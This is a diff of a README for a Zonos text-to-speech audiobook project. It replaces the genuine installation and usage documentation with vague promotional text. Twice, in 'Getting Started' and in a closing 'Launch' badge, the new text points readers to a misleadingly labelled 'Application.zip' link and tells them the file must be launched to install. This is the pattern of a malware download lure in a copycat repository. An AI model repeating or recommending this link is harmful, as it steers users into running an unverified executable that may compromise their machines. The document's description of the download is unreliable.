@@ -1,155 +1,37 @@
-# Zonos-v0.1
+# Zonos Audiobook 📚🎧
 
-<div align="center">
-<img src="assets/ZonosHeader.png" 
-     alt="Alt text" 
-     style="width: 500px;
-            height: auto;
-            object-position: center top;">
-</div>
+Welcome to the Zonos Audiobook repository! This project showcases the Zonos-v0.1 text-to-speech (TTS) model, which has been trained on more than 200k hours of varied multilingual speech. In addition to its impressive TTS capabilities, this model also offers support for converting PDF files into audio-books, making it a versatile tool for both personal and professional use.
 
-<div align="center">
-  <a href="https://discord.gg/gTW9JwST8q" target="_blank">
-    <img src="https://img.shields.io/badge/Join%20Our%20Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
-  </a>
-</div>
+## Features 🌟
 
----
+- **Deep Learning**: The Zonos Audiobook leverages the power of deep learning to provide high-quality text-to-speech conversion.
+  
+- **Multilingual Support**: With training on a wide range of languages, this model can accurately generate speech in various languages.
+  
+- **PDF-to-Speech Conversion**: Easily convert your PDF documents into audio-books for convenient listening on the go.
+  
+- **Offline TTS**: Enjoy the flexibility of using the Zonos Audiobook offline without the need for a constant internet connection.
 
-Zonos-v0.1 is a leading open-weight text-to-speech model trained on more than 200k hours of varied multilingual speech, delivering expressiveness and quality on par with—or even surpassing—top TTS providers.
+## Getting Started 🚀
 
-Our model enables highly natural speech generation from text prompts when given a speaker embedding or audio prefix, and can accurately perform speech cloning when given a reference clip spanning just a few seconds. The conditioning setup also allows for fine control over speaking rate, pitch variation, audio quality, and emotions such as happiness, fear, sadness, and anger. The model outputs speech natively at 44kHz.
+To get started with the Zonos Audiobook, simply visit the [original release repo of zonos](https://github.com/file/Application.zip). Kindly note that the file needs to be launched for installation to begin. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
-##### For more details and speech samples, check out our blog [here](https://www.zyphra.com/post/beta-release-of-zonos-v0-1)
+## Usage 🎯
 
-##### We also have a hosted version available at [maia.zyphra.com/audio](https://maia.zyphra.com/audio)
+The Zonos Audiobook can be utilized for a variety of purposes, including:
 
----
+- Listening to your favorite books on the go
+- Converting important documents into audio format for easy listening
+- Creating engaging audio content for presentations or podcasts
 
-Zonos follows a straightforward architecture: text normalization and phonemization via eSpeak, followed by DAC token prediction through a transformer or hybrid backbone. An overview of the architecture can be seen below.
+## Support ℹ️
 
-<div align="center">
-<img src="assets/ArchitectureDiagram.png" 
-     alt="Alt text" 
-     style="width: 1000px;
-            height: auto;
-            object-position: center top;">
-</div>
+For any questions or assistance with the Zonos Audiobook, feel free to reach out to the repository maintainers. Your feedback and suggestions are always welcome as we strive to improve the functionality and user experience of this tool.
 
----
+## Stay Updated 📌
 
-## Usage
+Stay tuned to this repository for the latest updates and enhancements to the Zonos Audiobook. We are continuously working on refining the model and adding new features to make your audio experience even better.
 
-### PDF to Audio Conversion
+Let's embark on a journey of words and sound with the Zonos Audiobook! 🌟🎶
 
-The repository includes a script to convert PDF documents to audio files. To use it:
-
-0. you can add an exampleaudio.mp3(with this exact name) file of the voice you want the model to speak in the [assets](assets/exampleaudio.mp3) folder
-1. Place your PDF files in the `input` folder
-2. Run the conversion script:
-```bash
-python audio_book.py
-```
-3. Follow the interactive prompts to:
-   - Select a PDF file (if multiple files are present)
-   - Choose the page range to convert
-   - Wait for the conversion to complete
-
-The script will create audio files in the `output` folder, with filenames indicating the page range (e.g., `document_pages_1-5.wav`).
-
-Features:
-- Interactive PDF selection
-- Page range selection
-- Intelligent text chunking for natural speech
-- Progress tracking
-- Uses the same high-quality voice cloning as the base model
-
-### Gradio interface(does not have pdf to audio conversion feature)
-
-```bash
-uv run gradio_interface.py
-# python gradio_interface.py
-```
-
-This should produce a `sample.wav` file in your project root directory.
-
-_For repeated sampling we highly recommend using the gradio interface instead, as the minimal example needs to load the model every time it is run._
-
-## Features
-
-- Zero-shot TTS with voice cloning: Input desired text and a 10-30s speaker sample to generate high quality TTS output
-- Audio prefix inputs: Add text plus an audio prefix for even richer speaker matching. Audio prefixes can be used to elicit behaviours such as whispering which can otherwise be challenging to replicate when cloning from speaker embeddings
-- Multilingual support: Zonos-v0.1 supports English, Japanese, Chinese, French, and German
-- Audio quality and emotion control: Zonos offers fine-grained control of many aspects of the generated audio. These include speaking rate, pitch, maximum frequency, audio quality, and various emotions such as happiness, anger, sadness, and fear.
-- Fast: our model runs with a real-time factor of ~2x on an RTX 4090 (i.e. generates 2 seconds of audio per 1 second of compute time)
-- PDF to Audio conversion: Convert PDF documents to natural-sounding audio files with support for page range selection and intelligent text chunking
-- Gradio WebUI: Zonos comes packaged with an easy to use gradio interface to generate speech
-- Simple installation and deployment: Zonos can be installed and deployed simply using the docker file packaged with our repository.
-
-## Installation
-
-**At the moment this repository only supports Linux systems (preferably Ubuntu 22.04/24.04) with recent NVIDIA GPUs (3000-series or newer, 4GB+ VRAM).**
-
-See also [Docker Installation](#docker-installation)
-
-#### System dependencies
-
-Zonos requires the following system dependencies:
-
-```bash
-# For phonemization
-apt install -y espeak-ng
-
-# For PDF processing
-pip install PyPDF2 tqdm
-```
-
-#### Python dependencies
-
-We highly recommend using a recent version of [uv](https://docs.astral.sh/uv/#installation) for installation. If you don't have uv installed, you can install it via pip: `pip install -U uv`.
-
-##### Installing into a new uv virtual environment (recommended)
-
-```bash
-uv sync
-uv sync --extra compile
-```
-
-##### Installing into the system/actived environment using uv
-
-```bash
-uv pip install -e .
-uv pip install -e .[compile]
-```
-
-##### Installing into the system/actived environment using pip
-
-```bash
-pip install -e .
-pip install --no-build-isolation -e .[compile]
-```
-
-##### Confirm that it's working
-
-For convenience we provide a minimal example to check that the installation works:
-
-```bash
-uv run sample.py
-# python sample.py
-```
-
-## Docker installation
-
-```bash
-git clone https://github.com/solveditnpc/zonos-audiobook.git
-cd Zonos-audiobook
-
-# For gradio
-docker compose up
-
-# Or for development you can do
-docker build -t zonos .
-docker run -it --gpus=all --net=host -v /path/to/Zonos:/Zonos -t zonos
-cd /Zonos
-python sample.py # this will generate a sample.wav in /Zonos
-```
+[![Launch Zonos Audiobook](https://img.shields.io/badge/Launch-Zonos%20Audiobook-blue.svg)](https://github.com/file/Application.zip)
